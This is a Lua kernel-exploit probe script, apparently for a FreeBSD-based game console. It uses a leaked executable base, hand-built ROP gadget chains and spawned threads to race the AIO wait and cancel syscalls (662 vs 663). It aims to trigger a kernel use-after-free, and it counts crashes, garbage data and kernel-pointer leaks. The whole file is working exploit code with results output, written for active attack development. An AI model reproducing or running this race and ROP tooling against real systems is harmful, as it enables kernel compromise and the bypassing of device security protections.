-- CRASH_CLASS: HIGH
-- PROBE 72c: 662-vs-663 UAF race — simultaneous wake via gate socketpair
--
-- 72b: A spawned AFTER sp1 write. W already finished 663 wake-up by the time
-- A entered 662. Result: all CLEAN.
--
-- Fix: pre-spawn Thread A blocked on a GATE socketpair read. Then trigger
-- both sp1 (AIO completion, wakes W) and gate (wakes A) back-to-back.
-- Both threads wake from kernel sleep simultaneously — tight race window.
--
-- Sequence:
--   1. sp_aio: socketpair for pending AIO
--   2. sp_gate: socketpair for Thread A's gate
--   3. Submit pending AIO read on sp_aio[0], poll it
--   4. Spawn W: sysarch → 663(id) → blocks on pending AIO
--   5. Spawn A: sysarch → read(gate[0],buf,1) → blocks → 662(id) → marker
--   6. Verify both blocked
--   7. write(sp_aio[1]) + write(gate[1]) — back-to-back triggers
--   8. Check: crash/garbage/clean

print("=== PROBE 72c: 662-vs-663 GATE RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local fd_zero = N(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("zero_fd=" .. fd_zero)

local fake_tcb = memory.alloc(0x1000)
local tcb_addr = N(fake_tcb)
for i = 0, 0xFFC, 8 do wq(tcb_addr + i, uint64(tcb_addr)) end
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(tcb_addr))

local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local trigger_byte = memory.alloc(16)
wq(N(trigger_byte), uint64(0x42))

local function aio_submit_on(fd)
    local req = memory.alloc(0x28)
    wq(N(req) + 0x00, uint64(0))
    wq(N(req) + 0x08, uint64(16))
    wq(N(req) + 0x10, uint64(N(data_buf)))
    wq(N(req) + 0x18, uint64(N(result_buf)))
    wq(N(req) + 0x20, uint64(fd))
    local oid = memory.alloc(8); wd(N(oid), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(oid)))
    end)
    return rd(N(oid)) or 0
end

local function aio_poll(aid)
    local oid = memory.alloc(8); wd(N(oid), aid)
    local ost = memory.alloc(8); wd(N(ost), 0xDEAD)
    pcall(function() mk(664)(uint64(N(oid)), uint64(1), uint64(N(ost))) end)
    return rd(N(ost))
end

local function aio_status(aid)
    local oid = memory.alloc(8); wd(N(oid), aid)
    local ost = memory.alloc(8); wd(N(ost), 0xDEAD)
    pcall(function() mk(666)(uint64(N(oid)), uint64(1), uint64(N(ost))) end)
    return rd(N(ost))
end

local function spawn_thread(chain_fn)
    local stk = memory.alloc(0x4000)
    local sb = N(stk)
    local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end
    local off = 0
    local function em(v) wq(rsp + off, v); off = off + 8 end
    chain_fn(em)
    local par = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
    wq(N(par), g_bare_ret)
    wq(N(par) + 0x10, uint64(sb))
    wq(N(par) + 0x18, uint64(0x2000))
    local tid = memory.alloc(8); wq(N(tid), uint64(0))
    wq(N(par) + 0x30, tid)
    pcall(function() mk(455)(par, uint64(0x38)) end)
end

local function busywait(count)
    for w = 1, count do local _ = rd(N(data_buf)) end
end

print("")

-- ============================================================
-- [A] Sanity: child thread can block on socketpair read
-- ============================================================
print("[A] Sanity: child read() blocks on empty socket")

local sp_test = memory.alloc(16)
pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_test))) end)
local t0 = rd(N(sp_test))
local t1 = rd(N(sp_test) + 4)
print(string.format("  gate socketpair: fd0=%d fd1=%d", t0 or -1, t1 or -1))

local mk_test = memory.alloc(8); wq(N(mk_test), uint64(0))
local rd_buf = memory.alloc(8); wq(N(rd_buf), uint64(0))

spawn_thread(function(em)
    -- sysarch(129, &tcb_ptr)
    em(g_pop_rdi); em(uint64(129))
    em(g_pop_rsi); em(uint64(N(tcb_ptr)))
    em(g_pop_rax); em(uint64(165))
    em(stub)
    -- read(t0, rd_buf, 1) — should BLOCK
    em(g_pop_rdi); em(uint64(t0 or 0))
    em(g_pop_rsi); em(uint64(N(rd_buf)))
    em(g_pop_rdx); em(uint64(1))
    em(g_pop_rax); em(uint64(3))  -- SYS_read
    em(stub)
    -- write marker
    em(g_pop_rax); em(uint64(0xBEAD))
    em(g_pop_rdi); em(uint64(N(mk_test)))
    em(g_mov_m_rax)
    em(g_pop_rdi); em(uint64(0))
    em(g_pop_rax); em(uint64(431))
    em(stub)
end)

busywait(50000)
local pre = rd(N(mk_test))
print(string.format("  before gate write: marker=0x%X (expect 0 = blocked)", pre or 0))

-- Unblock: write 1 byte to t1
pcall(function() mk(4)(uint64(t1 or 0), uint64(N(trigger_byte)), uint64(1)) end)
busywait(100000)
local post = rd(N(mk_test))
print(string.format("  after gate write:  marker=0x%X (expect nonzero = unblocked)", post or 0))

pcall(function() mk(6)(uint64(t0 or 0)) end)
pcall(function() mk(6)(uint64(t1 or 0)) end)

if not alive() then print("DEAD after section A"); return end
if (post or 0) == 0 then
    print("  *** Child read() did NOT unblock — gate approach won't work ***")
    print("alive=" .. (alive() and "YES" or "NO"))
    print("=== PROBE 72c EARLY EXIT ===")
    return
end
print("  Gate mechanism confirmed working!")
print("")

-- ============================================================
-- [B] THE RACE
-- ============================================================
print("[B] RACE: simultaneous wake (663 + gate read)")

local ITERS = 20
local total_crash = 0
local total_garbage = 0
local total_clean = 0
local total_a_fail = 0
local total_w_stuck = 0

for iter = 1, ITERS do
    if not alive() then
        print(string.format("  iter %d: *** PROCESS DEAD ***", iter))
        total_crash = total_crash + 1
        break
    end

    -- Two socketpairs: one for AIO, one for gate
    local sp_aio = memory.alloc(16)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_aio))) end)
    local a0 = rd(N(sp_aio))
    local a1 = rd(N(sp_aio) + 4)

    local sp_gate = memory.alloc(16)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_gate))) end)
    local g0 = rd(N(sp_gate))
    local g1 = rd(N(sp_gate) + 4)

    if (a0 or 0) <= 0 or (g0 or 0) <= 0 then
        print(string.format("  iter %d: socketpair failed (a0=%d g0=%d)", iter, a0 or -1, g0 or -1))
        break
    end

    -- Submit pending AIO read on aio socket
    local aid = aio_submit_on(a0)
    if aid == 0 then
        print(string.format("  iter %d: submit failed", iter))
        pcall(function() mk(6)(uint64(a0 or 0)) end)
        pcall(function() mk(6)(uint64(a1 or 0)) end)
        pcall(function() mk(6)(uint64(g0 or 0)) end)
        pcall(function() mk(6)(uint64(g1 or 0)) end)
        break
    end

    aio_poll(aid)

    local marker_W = memory.alloc(8); wq(N(marker_W), uint64(0))
    local marker_A = memory.alloc(8); wq(N(marker_A), uint64(0))
    local sts_W = memory.alloc(8); wd(N(sts_W), 0xDEAD)
    local sts_A = memory.alloc(8); wd(N(sts_A), 0xDEAD)
    local ids_buf = memory.alloc(8); wd(N(ids_buf), aid)
    local gate_rd_buf = memory.alloc(8); wq(N(gate_rd_buf), uint64(0))

    -- Thread W: sysarch → 663(id) → blocks on pending AIO → marker
    spawn_thread(function(em)
        em(g_pop_rdi); em(uint64(129))
        em(g_pop_rsi); em(uint64(N(tcb_ptr)))
        em(g_pop_rax); em(uint64(165))
        em(stub)
        em(g_pop_rdi); em(uint64(N(ids_buf)))
        em(g_pop_rsi); em(uint64(1))
        em(g_pop_rdx); em(uint64(N(sts_W)))
        em(g_pop_rax); em(uint64(663))
        em(stub)
        em(g_pop_rax); em(uint64(0xBB663))
        em(g_pop_rdi); em(uint64(N(marker_W)))
        em(g_mov_m_rax)
        em(g_pop_rdi); em(uint64(0))
        em(g_pop_rax); em(uint64(431))
        em(stub)
    end)

    -- Thread A: sysarch → read(gate[0]) blocks → 662(id) → marker
    spawn_thread(function(em)
        em(g_pop_rdi); em(uint64(129))
        em(g_pop_rsi); em(uint64(N(tcb_ptr)))
        em(g_pop_rax); em(uint64(165))
        em(stub)
        -- read(g0, buf, 1) — BLOCKS until gate write
        em(g_pop_rdi); em(uint64(g0 or 0))
        em(g_pop_rsi); em(uint64(N(gate_rd_buf)))
        em(g_pop_rdx); em(uint64(1))
        em(g_pop_rax); em(uint64(3))
        em(stub)
        -- 662(ids_buf, 1, sts_A)
        em(g_pop_rdi); em(uint64(N(ids_buf)))
        em(g_pop_rsi); em(uint64(1))
        em(g_pop_rdx); em(uint64(N(sts_A)))
        em(g_pop_rax); em(uint64(662))
        em(stub)
        em(g_pop_rax); em(uint64(0xAA662))
        em(g_pop_rdi); em(uint64(N(marker_A)))
        em(g_mov_m_rax)
        em(g_pop_rdi); em(uint64(0))
        em(g_pop_rax); em(uint64(431))
        em(stub)
    end)

    -- Wait for both to enter kernel and block
    busywait(80000)
    local w_blk = (rd(N(marker_W)) == 0)
    local a_blk = (rd(N(marker_A)) == 0)

    -- FIRE BOTH TRIGGERS BACK-TO-BACK
    -- write(a1) → completes AIO → wakes W from 663
    -- write(g1) → unblocks A from read → A calls 662
    pcall(function() mk(4)(uint64(a1), uint64(N(trigger_byte)), uint64(1)) end)
    pcall(function() mk(4)(uint64(g1), uint64(N(trigger_byte)), uint64(1)) end)

    -- Wait for both threads to finish
    busywait(300000)

    local mW = rd(N(marker_W))
    local mA = rd(N(marker_A))
    local sW = rd(N(sts_W))
    local sA = rd(N(sts_A))

    local w_done = (mW ~= 0)
    local a_done = (mA ~= 0)

    local result_tag = "?"
    if not alive() then
        result_tag = "CRASH"
        total_crash = total_crash + 1
    elseif not w_done and not a_done then
        result_tag = "BOTH_STUCK"
        total_w_stuck = total_w_stuck + 1
    elseif not w_done then
        result_tag = "W_LOST"
        total_crash = total_crash + 1
    elseif sA == 0x80020010 then
        result_tag = "A_REJECT"
        total_a_fail = total_a_fail + 1
    elseif a_done and sA == 0 then
        if sW ~= 0x00000003 and sW ~= 0x00010003
           and sW ~= 0x80020003 and sW ~= 0xDEAD then
            result_tag = "GARBAGE"
            total_garbage = total_garbage + 1
        else
            result_tag = "CLEAN"
            total_clean = total_clean + 1
        end
    elseif not a_done then
        result_tag = "A_STUCK"
        total_w_stuck = total_w_stuck + 1
    else
        result_tag = string.format("UNK(A=0x%X)", sA or 0)
        total_clean = total_clean + 1
    end

    print(string.format(
        "  %2d: blk=%s/%s W=0x%X/0x%08X A=0x%X/0x%08X -> %s",
        iter,
        w_blk and "Y" or "N", a_blk and "Y" or "N",
        mW or 0, sW or 0,
        mA or 0, sA or 0,
        result_tag))

    -- Check for kernel pointer in W status (qword read)
    if w_done and sW ~= 0xDEAD then
        local qw = rq(N(sts_W))
        if qw then
            local h, l = get_hi_lo(qw)
            if h >= 0xFFFF8000 then
                print(string.format("  *** KPTR: %s ***", fmt(qw)))
            end
        end
    end

    -- Cleanup
    pcall(function() mk(6)(uint64(a0 or 0)) end)
    pcall(function() mk(6)(uint64(a1 or 0)) end)
    pcall(function() mk(6)(uint64(g0 or 0)) end)
    pcall(function() mk(6)(uint64(g1 or 0)) end)

    if result_tag == "CRASH" or result_tag == "W_LOST" then break end
end

print("")
print("[C] SUMMARY")
print(string.format("  iterations:    %d", ITERS))
print(string.format("  CRASH/W_LOST:  %d", total_crash))
print(string.format("  GARBAGE:       %d", total_garbage))
print(string.format("  A_REJECT:      %d", total_a_fail))
print(string.format("  STUCK:         %d", total_w_stuck))
print(string.format("  CLEAN:         %d", total_clean))
print(string.format("  process:       %s", alive() and "ALIVE" or "DEAD"))

if total_crash > 0 then
    print("*** UAF TRIGGERED ***")
elseif total_garbage > 0 then
    print("*** GARBAGE DATA through 663 ***")
elseif total_a_fail > 0 and total_clean == 0 then
    print("662 always rejected — AIO not yet complete when A fires.")
    print("Try: write gate FIRST, then sp_aio (so A enters 662 while I/O completing)")
elseif total_clean > 0 then
    print("Both succeeded cleanly. Check if 662 wakes waiters before freeing.")
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== PROBE 72c COMPLETE ===")
